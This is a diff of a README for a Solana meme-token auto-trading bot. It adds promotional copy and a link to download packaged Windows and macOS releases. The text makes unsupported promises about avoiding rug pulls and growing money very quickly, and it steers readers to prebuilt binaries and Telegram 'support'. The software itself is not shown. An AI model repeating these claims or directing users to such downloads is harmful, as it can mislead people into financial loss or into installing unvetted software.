@@ -5,8 +5,11 @@
 <img src=https://img.shields.io/github/issues-pr/CryptoAiBots/Meme-Token-Hunter-Bot?style=for-the-badge&logo=appveyor&color=informational />
 </p>
 
+![CryptoBot](/MTHBot_Ui_dashboard.png)
 
-# Meme Token Hunter Bot: AI-Powered Meme Token Hunting Bot
+# MTHBot (Meme Token Hunter Bot) AI-Powered Meme Token Hunting and Auto Trade Bot
+
+Introducing our cutting-edge AI-powered trading bot that lists all meme tokens on the Solana network and performs real-time trades once they are deemed safe. Avoid rug pulls and maximize your profits with this intelligent auto trading solution designed for the fast-paced crypto market. Check it out now to stay ahead of the curve!
 
 Meme tokens are one of the most exciting and lucrative sectors of the cryptocurrency market. Yet, this space can be quite complex and time-consuming for those looking to find truly great tokens to invest in. This bot is designed to make the process of finding and investing in meme tokens easier.
 
@@ -32,7 +35,11 @@ Additionally, the bot handles all transactions fully automatically, which means 
 
 With our 24/7 live Telegram support service, you can instantly find answers to any questions you may have.
 
-## ⚡ Installation Way I
+## [Download (Windows / macOS)](https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/releases)
+
+You can easily access our application by downloading the packaged version suitable for your operating system from the link above.
+
+## ⚡ Source Installation Way I
 
 Download and Install Git here:
 [Git](https://git-scm.com/download/win)
@@ -50,14 +57,12 @@ main.py
 ```
 And follow the instructions in the application window.
 
-## ⚡ Installation Way II
+## ⚡ Source Installation Way II
 
 - Download and install [Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
 - Download [This Repo](https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/archive/refs/heads/main.zip) the repository release and extract files. 
 - Double-click on the "main.py" file to run it.
 - And follow the instructions in the application window.
-  
-![CryptoBot](/dashboard.png)
 
 **Special Support Service**
 
@@ -88,4 +93,3 @@ If you have money and aim to increase it very quickly to very large amounts, you
 ## Links
 
 * [Telegram Support](https://t.me/pancakeswapprediction)
-* [Twitter](https://x.com/PremiumPumpDump)
